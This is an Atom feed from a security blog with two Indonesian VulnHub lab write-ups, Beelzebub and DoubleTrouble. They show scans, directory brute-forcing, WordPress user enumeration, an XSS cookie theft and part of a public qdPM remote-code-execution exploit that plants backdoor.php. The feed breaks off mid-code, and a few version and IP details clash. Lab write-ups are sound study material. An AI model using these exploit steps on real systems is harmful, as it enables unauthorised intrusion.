<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-11-24T14:52:12+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sharpicx</title><subtitle>linux &amp; cybersecurity big fan </subtitle><entry><title type="html">VulnHub: Beelzebub</title><link href="http://localhost:4000/vh-beelzebub" rel="alternate" type="text/html" title="VulnHub: Beelzebub" /><published>2022-11-21T00:00:00+07:00</published><updated>2022-11-21T00:00:00+07:00</updated><id>http://localhost:4000/vh-beelzebub</id><content type="html" xml:base="http://localhost:4000/vh-beelzebub"><![CDATA[<h2 id="nmap-scanning">nmap scanning</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Thu Nov 17 12:19:35 2022 as: nmap -vvv -p 22,80 -sCV -A -oN scan_tcp 192.168.56.30
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.30
Host is up, received syn-ack (0.00044s latency).
Scanned at 2022-11-17 12:19:36 WIB for 6s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoqt4FP0lhkJ0tTiMEUrVqRIcNKgQK22LJCOIVa1yoZf+bgOqsR4mIDjgpaJm/SDrAzRhVlD1dL6apkv7T7iceuo5QDXYvRLWS+PfsEaGwGpEVtpTCl/BjDVVtohdzgErXS69pJhgo9a1yNgVrH/W2SUE1b36ODSNqVb690+aP6jjJdyh2wi8GBlNMXBy6V5hR/qmFC55u7F/z5oG1tZxeZpDHbgdM94KRO9dR0WfKDIBQGa026GGcXtN10wtui2UHo65/6WgIG1LxgjppvOQUBMzj1SHuYqnKQLZyQ18E8oxLZTjc6OC898TeYMtyyKW0viUzeaqFxXPDwdI6G91J
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO9gF8Fv+Uox9ftsvK/DNkPNObtE4BiuaXjwksbOizwtXBepSbhUTyL5We/fWe7x62XW0CMFJWcuQsBNS7IyjsE=
|   256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINfCRDfwNshxW7uRiu76SMZx2hg865qS6TApHhvwKSH5
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 17 12:19:42 2022 -- 1 IP address (1 host up) scanned in 7.77 seconds
</code></pre></div></div>

<h2 id="directory-brute-forcing">directory brute-forcing</h2>

<p>cuma ada 3 directory terkena scanned.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/javascript          [36m (Status: 301)[0m [Size: 319][34m [--&gt; http://192.168.56.30/javascript/][0m
/phpmyadmin          [36m (Status: 301)[0m [Size: 319][34m [--&gt; http://192.168.56.30/phpmyadmin/][0m
/server-status       [33m (Status: 403)[0m [Size: 278]
</code></pre></div></div>
<p>apa jadinya jika saya tambahkan format extension pada <code class="language-plaintext highlighter-rouge">gobuster</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/beelzebub]
â•°â”€î˜‚ cat gobuster_2 
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 271]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--&gt; http://192.168.56.30/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--&gt; http://192.168.56.30/phpmyadmin/]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/phpinfo.php          (Status: 200) [Size: 95422]
/server-status        (Status: 403) [Size: 278]
</code></pre></div></div>
<p>Haha! ada dua file index yang satu menggunakan <code class="language-plaintext highlighter-rouge">.html</code> dan yang satu lagi menggunakan <code class="language-plaintext highlighter-rouge">php</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
  &lt;!--
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
    See: https://launchpad.net/bugs/1288690
  --&gt;
  &lt;head&gt;
    &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
    &lt;title&gt;Apache2 Ubuntu Default Page: It works&lt;/title&gt;
    &lt;style type="text/css" media="screen"&gt;
  * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

  body, html {
    padding: 3px 3px 3px 3px;

    background-color: #D8DBE2;

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }

  div.main_page {
    position: relative;
    display: table;

    width: 800px;

    margin-bottom: 3px;
    margin-left: auto;
    margin-right: auto;
    padding: 0px 0px 0px 0px;

    border-width: 2px;
    border-color: #212738;
    border-style: solid;

    background-color: #FFFFFF;

    text-align: center;
  }

  div.page_header {
    height: 99px;
    width: 100%;

    background-color: #F5F6F7;
  }

  div.page_header span {
    margin: 15px 0px 0px 50px;

    font-size: 180%;
    font-weight: bold;
  }

  div.page_header img {
    margin: 3px 0px 0px 40px;

    border: 0px 0px 0px;
  }

  div.table_of_contents {
    clear: left;

    min-width: 200px;

    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.table_of_contents_item {
    clear: left;

    width: 100%;

    margin: 4px 0px 0px 0px;

    background-color: #FFFFFF;

    color: #000000;
    text-align: left;
  }

  div.table_of_contents_item a {
    margin: 6px 0px 0px 6px;
  }

  div.content_section {
    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.content_section_text {
    padding: 4px 8px 4px 8px;

    color: #000000;
    font-size: 100%;
  }

  div.content_section_text pre {
    margin: 8px 0px 8px 0px;
    padding: 8px 8px 8px 8px;

    border-width: 1px;
    border-style: dotted;
    border-color: #000000;

    background-color: #F5F6F7;

    font-style: italic;
  }

  div.content_section_text p {
    margin-bottom: 6px;
  }

  div.content_section_text ul, div.content_section_text li {
    padding: 4px 8px 4px 16px;
  }

  div.section_header {
    padding: 3px 6px 3px 6px;

    background-color: #8E9CB2;

    color: #FFFFFF;
    font-weight: bold;
    font-size: 112%;
    text-align: center;
  }

  div.section_header_red {
    background-color: #CD214F;
  }

  div.section_header_grey {
    background-color: #9F9386;
  }

  .floating_element {
    position: relative;
    float: left;
  }

  div.table_of_contents_item a,
  div.content_section_text a {
    text-decoration: none;
    font-weight: bold;
  }

  div.table_of_contents_item a:link,
  div.table_of_contents_item a:visited,
  div.table_of_contents_item a:active {
    color: #000000;
  }

  div.table_of_contents_item a:hover {
    background-color: #000000;

    color: #FFFFFF;
  }

  div.content_section_text a:link,
  div.content_section_text a:visited,
   div.content_section_text a:active {
    background-color: #DCDFE6;

    color: #000000;
  }

  div.content_section_text a:hover {
    background-color: #000000;

    color: #DCDFE6;
  }

  div.validator {
  }
    &lt;/style&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="main_page"&gt;
      &lt;div class="page_header floating_element"&gt;
        &lt;img src="/icons/ubuntu-logo.png" alt="Ubuntu Logo" class="floating_element"/&gt;
        &lt;span class="floating_element"&gt;
          Apache2 Ubuntu Default Page
        &lt;/span&gt;
      &lt;/div&gt;
&lt;!--      &lt;div class="table_of_contents floating_element"&gt;
        &lt;div class="section_header section_header_grey"&gt;
          TABLE OF CONTENTS
        &lt;/div&gt;
        &lt;div class="table_of_contents_item floating_element"&gt;
          &lt;a href="#about"&gt;About&lt;/a&gt;
        &lt;/div&gt;
        &lt;div class="table_of_contents_item floating_element"&gt;
          &lt;a href="#changes"&gt;Changes&lt;/a&gt;
        &lt;/div&gt;
        &lt;div class="table_of_contents_item floating_element"&gt;
          &lt;a href="#scope"&gt;Scope&lt;/a&gt;
        &lt;/div&gt;
        &lt;div class="table_of_contents_item floating_element"&gt;
          &lt;a href="#files"&gt;Config files&lt;/a&gt;
        &lt;/div&gt;
      &lt;/div&gt;
--&gt;
      &lt;div class="content_section floating_element"&gt;


        &lt;div class="section_header section_header_red"&gt;
          &lt;div id="about"&gt;&lt;/div&gt;
          It works!
        &lt;/div&gt;
        &lt;div class="content_section_text"&gt;
          &lt;p&gt;
                This is the default welcome page used to test the correct 
                operation of the Apache2 server after installation on Ubuntu systems.
                It is based on the equivalent page on Debian, from which the Ubuntu Apache
                packaging is derived.
                If you can read this page, it means that the Apache HTTP server installed at
                this site is working properly. You should &lt;b&gt;replace this file&lt;/b&gt; (located at
                &lt;tt&gt;/var/www/html/index.html&lt;/tt&gt;) before continuing to operate your HTTP server.
          &lt;/p&gt;


          &lt;p&gt;
                If you are a normal user of this web site and don't know what this page is
                about, this probably means that the site is currently unavailable due to
                maintenance.
                If the problem persists, please contact the site's administrator.
          &lt;/p&gt;

        &lt;/div&gt;
        &lt;div class="section_header"&gt;
          &lt;div id="changes"&gt;&lt;/div&gt;
                Configuration Overview
        &lt;/div&gt;
        &lt;div class="content_section_text"&gt;
          &lt;p&gt;
                Ubuntu's Apache2 default configuration is different from the
                upstream default configuration, and split into several files optimized for
                interaction with Ubuntu tools. The configuration system is
                &lt;b&gt;fully documented in
                /usr/share/doc/apache2/README.Debian.gz&lt;/b&gt;. Refer to this for the full
                documentation. Documentation for the web server itself can be
                found by accessing the &lt;a href="/manual"&gt;manual&lt;/a&gt; if the &lt;tt&gt;apache2-doc&lt;/tt&gt;
                package was installed on this server.

          &lt;/p&gt;
          &lt;p&gt;
                The configuration layout for an Apache2 web server installation on Ubuntu systems is as follows:
          &lt;/p&gt;
          &lt;pre&gt;
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf
          &lt;/pre&gt;
          &lt;ul&gt;
                        &lt;li&gt;
                           &lt;tt&gt;apache2.conf&lt;/tt&gt; is the main configuration
                           file. It puts the pieces together by including all remaining configuration
                           files when starting up the web server.
                        &lt;/li&gt;

                        &lt;li&gt;
                           &lt;tt&gt;ports.conf&lt;/tt&gt; is always included from the
                           main configuration file. It is used to determine the listening ports for
                           incoming connections, and this file can be customized anytime.
                        &lt;/li&gt;

                        &lt;li&gt;
                           Configuration files in the &lt;tt&gt;mods-enabled/&lt;/tt&gt;,
                           &lt;tt&gt;conf-enabled/&lt;/tt&gt; and &lt;tt&gt;sites-enabled/&lt;/tt&gt; directories contain
                           particular configuration snippets which manage modules, global configuration
                           fragments, or virtual host configurations, respectively.
                        &lt;/li&gt;

                        &lt;li&gt;
                           They are activated by symlinking available
                           configuration files from their respective
                           *-available/ counterparts. These should be managed
                           by using our helpers
                           &lt;tt&gt;
                                a2enmod,
                                a2dismod,
                           &lt;/tt&gt;
                           &lt;tt&gt;
                                a2ensite,
                                a2dissite,
                            &lt;/tt&gt;
                                and
                           &lt;tt&gt;
                                a2enconf,
                                a2disconf
                           &lt;/tt&gt;. See their respective man pages for detailed information.
                        &lt;/li&gt;

                        &lt;li&gt;
                           The binary is called apache2. Due to the use of
                           environment variables, in the default configuration, apache2 needs to be
                           started/stopped with &lt;tt&gt;/etc/init.d/apache2&lt;/tt&gt; or &lt;tt&gt;apache2ctl&lt;/tt&gt;.
                           &lt;b&gt;Calling &lt;tt&gt;/usr/bin/apache2&lt;/tt&gt; directly will not work&lt;/b&gt; with the
                           default configuration.
                        &lt;/li&gt;
          &lt;/ul&gt;
        &lt;/div&gt;

        &lt;div class="section_header"&gt;
            &lt;div id="docroot"&gt;&lt;/div&gt;
                Document Roots
        &lt;/div&gt;

        &lt;div class="content_section_text"&gt;
            &lt;p&gt;
                By default, Ubuntu does not allow access through the web browser to
                &lt;em&gt;any&lt;/em&gt; file apart of those located in &lt;tt&gt;/var/www&lt;/tt&gt;,
                &lt;a href="http://httpd.apache.org/docs/2.4/mod/mod_userdir.html" rel="nofollow"&gt;public_html&lt;/a&gt;
                directories (when enabled) and &lt;tt&gt;/usr/share&lt;/tt&gt; (for web
                applications). If your site is using a web document root
                located elsewhere (such as in &lt;tt&gt;/srv&lt;/tt&gt;) you may need to whitelist your
                document root directory in &lt;tt&gt;/etc/apache2/apache2.conf&lt;/tt&gt;.
            &lt;/p&gt;
            &lt;p&gt;
                The default Ubuntu document root is &lt;tt&gt;/var/www/html&lt;/tt&gt;. You
                can make your own virtual hosts under /var/www. This is different
                to previous releases which provides better security out of the box.
            &lt;/p&gt;
        &lt;/div&gt;

        &lt;div class="section_header"&gt;
          &lt;div id="bugs"&gt;&lt;/div&gt;
                Reporting Problems
        &lt;/div&gt;
        &lt;div class="content_section_text"&gt;
          &lt;p&gt;
                Please use the &lt;tt&gt;ubuntu-bug&lt;/tt&gt; tool to report bugs in the
                Apache2 package with Ubuntu. However, check &lt;a
                href="https://bugs.launchpad.net/ubuntu/+source/apache2"
                rel="nofollow"&gt;existing bug reports&lt;/a&gt; before reporting a new bug.
          &lt;/p&gt;
          &lt;p&gt;
                Please report bugs specific to modules (such as PHP and others)
                to respective packages, not to the web server itself.
          &lt;/p&gt;
        &lt;/div&gt;




      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="validator"&gt;
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>
<p>kalau ini memang basis awal tampilan webnya, tapi apa yang terjadi pada <code class="language-plaintext highlighter-rouge">index.php</code> dengan mengirimkan request GET?</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/beelzebub]
â•°â”€î˜‚ curl -s "192.168.59.3/index.php"
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5--&gt;
&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.30 (Ubuntu)&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>
<p>hah katanya <code class="language-plaintext highlighter-rouge">Not Found</code>?</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/beelzebub]
â•°â”€î˜‚ curl -I "192.168.59.3/a"  
HTTP/1.1 404 Not Found
Date: Mon, 21 Nov 2022 20:15:09 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1
</code></pre></div></div>
<p>Tapi kenapa <code class="language-plaintext highlighter-rouge">index.php</code> berstatus <code class="language-plaintext highlighter-rouge">200 OK</code> dan memiliki header <code class="language-plaintext highlighter-rouge">Content-Type</code> dengan <code class="language-plaintext highlighter-rouge">charset=UTF-8</code>?</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/beelzebub]
â•°â”€î˜‚ curl -I "192.168.59.3/index.php"
HTTP/1.1 200 OK
Date: Mon, 21 Nov 2022 20:15:56 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Type: text/html; charset=UTF-8
</code></pre></div></div>
<p>Tanpa perlu ribet-ribet seperti itu tinggal dilihat bahwa result dari <code class="language-plaintext highlighter-rouge">GET Request</code> di awal memiliki versi Apache <code class="language-plaintext highlighter-rouge">2.4.30</code> sedangkan versi asli yang dipakai pada webserver ini adalah <code class="language-plaintext highlighter-rouge">Apache/2,4,29</code></p>

<h2 id="xss">XSS</h2>

<p><img src="https://i.postimg.cc/XNzd6SpB/image.png" alt="image" /></p>

<h2 id="wpscan-results">wpscan results</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
[i] User(s) Identified:

[+] valak
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] krampus
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
</code></pre></div></div>
<p>terdapat dua user yang bisa kita gunakan untuk masuk ke shell via <code class="language-plaintext highlighter-rouge">ssh</code>.</p>

<h2 id="shell-as-krampus">shell as krampus</h2>
<p>ketika saya mencoba user <code class="language-plaintext highlighter-rouge">valak</code>, ternyata tidak ada hasil yang memuaskan karena failed. lalu ketika saya beralih ke <code class="language-plaintext highlighter-rouge">krampus</code> dengan password yang sudah didapatkan melalui basic <code class="language-plaintext highlighter-rouge">XSS</code> untuk mendapatkan cookie-nya.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
</code></pre></div></div>]]></content><author><name></name></author><category term="vulnhub" /><category term="wordpress" /><category term="xss" /><summary type="html"><![CDATA[nmap scanning ``` Nmap 7.92 scan initiated Thu Nov 17 12:19:35 2022 as: nmap -vvv -p 22,80 -sCV -A -oN scan_tcp 192.168.56.30 mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using â€“system-dns or specify valid servers with â€“dns-servers Nmap scan report for 192.168.56.30 Host is up, received syn-ack (0.00044s latency). Scanned at 2022-11-17 12:19:36 WIB for 6s]]></summary></entry><entry><title type="html">VulnHub: DoubleTrouble</title><link href="http://localhost:4000/vh-doubletrouble" rel="alternate" type="text/html" title="VulnHub: DoubleTrouble" /><published>2022-11-16T00:00:00+07:00</published><updated>2022-11-16T00:00:00+07:00</updated><id>http://localhost:4000/vh-doubletrouble</id><content type="html" xml:base="http://localhost:4000/vh-doubletrouble"><![CDATA[<p>Mesin dengan kategori <code class="language-plaintext highlighter-rouge">easy</code> dari sebuah <em>open community</em> yaitu VulnHub dengan menjalankan nmap lalu melihat eksploitasi yang tercantum dan mencoba menjalankan script yang menarik dari hasil pencarian <code class="language-plaintext highlighter-rouge">searchsploit</code>. ditambah, mencari <code class="language-plaintext highlighter-rouge">credentials</code> dari image <code class="language-plaintext highlighter-rouge">jpg</code>. dan login menggunakan credentials tersebut, memasang revshell dan masuk ke sistem lalu menjalankan <code class="language-plaintext highlighter-rouge">sudo -l</code> untuk <code class="language-plaintext highlighter-rouge">abusing</code> ke root.</p>

<h2 id="nmap-scanning">nmap scanning</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4uqqKMblsYkzCZ7j1Mn8OX4iKqTf55w3nolFxM6IDIrQ7SV4JthEGqnYsiWFGY0OpwHLJ80/pnc/Ehlnub7RCGyL5gxGkGhZPKYag6RDv0cJNgIHf5oTkJOaFhRhZPDXztGlfafcVVw0Agxg3xweEVfU0GP24cb7jXq8Obu0j4bNsx7L0xbDCB1zxYwiqBRbkvRWpiQXNns/4HKlFzO19D8bCY/GXeX4IekE98kZgcG20x/zoBjMPXWXHUcYKoIVXQCDmBGAnlIdaC7IBJMNc1YbXVv7vhMRtaf/ffTtNDX0sYydBbqbubdZJsjWL0oHHK3Uwf+HlEhkO1jBZw3Aj
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDkds8dHvtrZmMxX2P71ej+q+QDe/MG8OGk7uYjWBT5K/TZR/QUkD9FboGbq1+SpCox5qqIVo8UQ+xvcEDDVKaU=
|   256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIoK0bHJ3ceMQ1mfATBnU9sChixXFA613cXEXeAyl2Y2
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: qdPM | Login
|_http-favicon: Unknown favicon MD5: B0BD48E57FD398C5DA8AE8F2CCC8D90D
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>
<p>Seperti biasa,</p>
<ul>
  <li><strong>22/TCP</strong> menunjukkan service <code class="language-plaintext highlighter-rouge">ssh</code> dengan versi <code class="language-plaintext highlighter-rouge">OpenSSH 8.9.1 Debian 10</code></li>
  <li><strong>80/TCP</strong> dengan service <code class="language-plaintext highlighter-rouge">http</code> dengan versi <code class="language-plaintext highlighter-rouge">Apache httpd 2.4.38</code> running on <code class="language-plaintext highlighter-rouge">Debian</code>.</li>
</ul>

<p>Karena penasaran dengan <code class="language-plaintext highlighter-rouge">http-title</code> saya mencoba untuk mencarinya lewat <code class="language-plaintext highlighter-rouge">public vulnerability databases</code> terkenal. yaitu <code class="language-plaintext highlighter-rouge">searchsploit</code>.</p>
<h2 id="searchsploit-checks">searchsploit checks</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ searchsploit "qdPM"
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
qdPM 7 - Arbitrary File upload                                                                                                                                                               | php/webapps/19154.py
qdPM 7.0 - Arbitrary '.PHP' File Upload (Metasploit)                                                                                                                                         | php/webapps/21835.rb
qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting                                                                                                                               | php/webapps/48486.txt
qdPM 9.1 - 'filter_by' SQL Injection                                                                                                                                                         | php/webapps/45767.txt
qdPM 9.1 - 'search[keywords]' Cross-Site Scripting                                                                                                                                           | php/webapps/46399.txt
qdPM 9.1 - 'search_by_extrafields[]' SQL Injection                                                                                                                                           | php/webapps/46387.txt
qdPM 9.1 - 'type' Cross-Site Scripting                                                                                                                                                       | php/webapps/46398.txt
qdPM 9.1 - Arbitrary File Upload                                                                                                                                                             | php/webapps/48460.txt
qdPM 9.1 - Remote Code Execution                                                                                                                                                             | php/webapps/47954.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)                                                                                                                                       | php/webapps/50175.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)                                                                                                                                  | php/webapps/50944.py
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                                                                 | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                                                               | php/webapps/50176.txt
qdPM &lt; 9.1 - Remote Code Execution                                                                                                                                                           | multiple/webapps/48146.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
</code></pre></div></div>
<h2 id="exploit-analyzing">exploit analyzing</h2>
<p>ada beberapa hal menarik yang ingin saya jelaskan di sini ialah dalam <code class="language-plaintext highlighter-rouge">php/webapps/47954.py</code> terdapat kode seperti yang ada di bawah</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">HOSTNAME</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'/index.php/login'</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="c1">#print(result.text)
</span>    <span class="n">login_tree</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">authenticity_token</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">login_tree</span><span class="p">.</span><span class="n">xpath</span><span class="p">(</span><span class="s">"//input[@name='login[_csrf_token]']/@value"</span><span class="p">)))[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'login[email]'</span><span class="p">:</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="s">'login[password]'</span><span class="p">:</span> <span class="n">PASSWORD</span><span class="p">,</span> <span class="s">'login[_csrf_token]'</span><span class="p">:</span> <span class="n">authenticity_token</span><span class="p">}</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'/index.php/login'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">referer</span><span class="o">=</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'/index.php/login'</span><span class="p">))</span>
    <span class="c1"># The designated admin account does not have a myAccount page
</span>    <span class="n">account_page</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'index.php/myAccount'</span><span class="p">)</span>
    <span class="n">account_tree</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">account_page</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
    <span class="n">userid</span> <span class="o">=</span> <span class="n">account_tree</span><span class="p">.</span><span class="n">xpath</span><span class="p">(</span><span class="s">"//input[@name='users[id]']/@value"</span><span class="p">)</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">account_tree</span><span class="p">.</span><span class="n">xpath</span><span class="p">(</span><span class="s">"//input[@name='users[name]']/@value"</span><span class="p">)</span>
    <span class="n">csrftoken_</span> <span class="o">=</span> <span class="n">account_tree</span><span class="p">.</span><span class="n">xpath</span><span class="p">(</span><span class="s">"//input[@name='users[_csrf_token]']/@value"</span><span class="p">)</span>
    <span class="n">req</span><span class="p">(</span><span class="n">userid</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">csrftoken_</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">HOSTNAME</span><span class="p">)</span>
    <span class="n">get_file</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'index.php/myAccount'</span><span class="p">)</span>
    <span class="n">final_tree</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">get_file</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
    <span class="n">backdoor</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">"uploads/users/"</span><span class="p">)</span>
    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">dateStamp</span> <span class="o">=</span> <span class="s">"1970-01-01 00:00"</span>
    <span class="n">backdoorFile</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">backdoor</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">):</span>
        <span class="n">count</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="s">"backdoor.php"</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">start</span> <span class="o">=</span> <span class="s">"</span><span class="se">\"</span><span class="s">right</span><span class="se">\"</span><span class="s">"</span>
                <span class="n">end</span> <span class="o">=</span> <span class="s">" &lt;/td"</span>
                <span class="n">line</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
